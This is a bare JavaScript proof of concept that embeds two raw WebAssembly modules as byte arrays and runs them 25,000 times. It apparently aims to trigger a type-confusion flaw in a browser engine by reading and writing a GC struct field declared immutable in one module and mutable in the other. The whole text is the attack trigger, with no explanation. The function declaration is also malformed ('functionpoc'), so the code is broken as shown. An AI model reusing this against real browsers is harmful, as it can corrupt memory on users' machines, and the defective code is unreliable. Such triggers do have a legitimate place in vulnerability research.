functionpoc() {
    const wasm_const = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 14, 2, 96, 0, 1, 107, 96, 1, 107, 1, 127, 2, 12, 1, 95, 1, 1, 127, 1, 0, 3, 3, 2, 0, 1, 7, 25, 2, 6, 99, 114, 101, 97, 116, 101, 0, 0, 4, 114, 101, 97, 100, 0, 1, 10, 21, 2, 7, 0, 65, 1, 251, 2, 0, 11, 10, 0, 32, 0, 212, 2, 251, 3, 0, 11]);
    const wasm_mut = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 8, 1, 96, 1, 107, 0, 2, 12, 1, 95, 1, 1, 127, 1, 1, 3, 2, 1, 0, 7, 10, 1, 5, 119, 114, 105, 116, 101, 0, 0, 10, 14, 1, 12, 0, 32, 0, 212, 2, 65, 2, 251, 4, 0, 11]);
    try {
        const module_const = new WebAssembly.Module(wasm_const);
        const module_mut = new WebAssembly.Module(wasm_mut);
        const instance_const = new WebAssembly.Instance(module_const);
        const instance_mut = new WebAssembly.Instance(module_mut);
        const s = instance_const.exports.create();
        instance_mut.exports.write(s);
        instance_const.exports.read(s);
    } catch (e) {}
}
for (let i = 0; i < 25000; ++i) {
    poc();
}